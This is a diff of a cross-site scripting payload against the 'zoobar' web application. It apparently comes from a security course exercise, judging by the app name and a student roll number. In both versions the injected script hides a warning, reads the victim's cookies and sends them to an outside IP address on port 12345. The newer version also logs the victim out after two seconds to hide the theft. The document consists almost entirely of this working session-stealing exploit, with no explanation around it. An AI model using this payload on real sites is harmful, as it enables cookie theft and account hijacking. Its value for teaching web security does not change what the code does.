@@ -1,22 +1,38 @@
-http://localhost:8080/zoobar/index.cgi/users?user=" size=10><script>
-document.addEventListener("DOMContentLoaded", run, false);
-function run(e) { 
-    document.getElementById("warning").style.visibility = 'hidden';
-}
-var req = new XMLHttpRequest();
-var ip        = "172.27.22.170:12345";
-var cookie    = encodeURIComponent(document.cookie);
-var rollno    = "13265";
-var random    = Math.floor((Math.random() * 1000000) + 1);
-var timestamp = Date.now();
-req.open(
-    "GET", 
-    "http://"+ ip +
-    "?payload="+cookie+
-    "&roll="+rollno+
-    "&random=" + random +
-    "&timestamp=" + Date.now(),
-    true
-    );
-req.send();
-</script></
+http://localhost:8080/zoobar/index.cgi/users?user=" size=10>
+<script>
+    document.addEventListener("DOMContentLoaded", run, false);
+    function run(e) { 
+        document.getElementById("warning").style.visibility = 'hidden';
+    }
+    
+    var req = new XMLHttpRequest();
+    var ip        = "172.27.22.170:12345";
+    var cookie    = encodeURIComponent(document.cookie);
+    var rollno    = "13265";
+    var random    = Math.floor((Math.random() * 1000) + 1);
+    var timestamp = Date.now();
+    req.open(
+        "GET", 
+        "http://"+ ip +
+        "?payload="+cookie+
+        "&roll="+rollno+
+        "&random=" + random +
+        "&timestamp=" + Date.now(),
+        true
+        );
+    req.send();
+
+    var req2 = new XMLHttpRequest();
+    req2.open(
+        "GET",
+        "http://localhost:8080/zoobar/index.cgi/logout",
+        true
+        );
+    setTimeout(
+        function(){ 
+            req2.send(); 
+            }, 
+        2000
+        );
+</script>
+</
